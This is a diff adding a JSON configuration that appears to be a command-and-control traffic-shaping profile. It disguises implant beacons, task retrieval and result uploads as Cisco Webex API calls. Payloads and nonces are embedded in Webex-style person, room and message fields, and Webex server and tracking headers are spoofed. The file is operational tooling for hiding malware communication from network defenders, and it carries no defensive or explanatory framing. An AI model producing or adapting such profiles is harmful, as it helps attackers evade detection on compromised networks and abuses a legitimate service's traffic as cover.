@@ -1,0 +1,55 @@
+{
+  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+  "linux_user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+
+  "beacon_path":  "/v1/people/me",
+  "tasks_path":   "/v1/rooms",
+  "results_path": "/v1/messages",
+
+  "extra_headers": {
+    "Accept": "application/json",
+    "Authorization": "Bearer NDA1YTFiMmMzZDRlNWY2ZzdoOGk5ajBr..."
+  },
+  "request_headers": {},
+
+  "response_headers": {
+    "Server": "Cisco",
+    "Trackingid": "WEBEX_00000000000000000000000000000000d",
+    "X-Content-Type-Options": "nosniff"
+  },
+
+  "shaping": {
+    "checkin_response": {
+      "template": {
+        "id": "Y2lzY29zcGFyazovL3VzL1BFT1BMRS8x",
+        "emails": [ "u@example.com" ],
+        "displayName": "{{payload}}",
+        "nickName": "user",
+        "orgId": "Y2lzY29zcGFyazovL3VzL09SR0FOSVpBVElPTi8x"
+      },
+      "extract": "displayName"
+    },
+    "tasks_response": {
+      "template": {
+        "items": [
+          {
+            "id": "Y2lzY29zcGFyazovL3VzL1JPT00vMQ",
+            "title": "{{nonce}}",
+            "description": "{{payload}}",
+            "type": "group",
+            "isLocked": false
+          }
+        ]
+      },
+      "extract": "items[0].description"
+    },
+    "results_request": {
+      "template": {
+        "roomId": "Y2lzY29zcGFyazovL3VzL1JPT00vMQ",
+        "text": "{{payload}}",
+        "markdown": "{{nonce}}"
+      },
+      "extract": "text"
+    }
+  }
+}
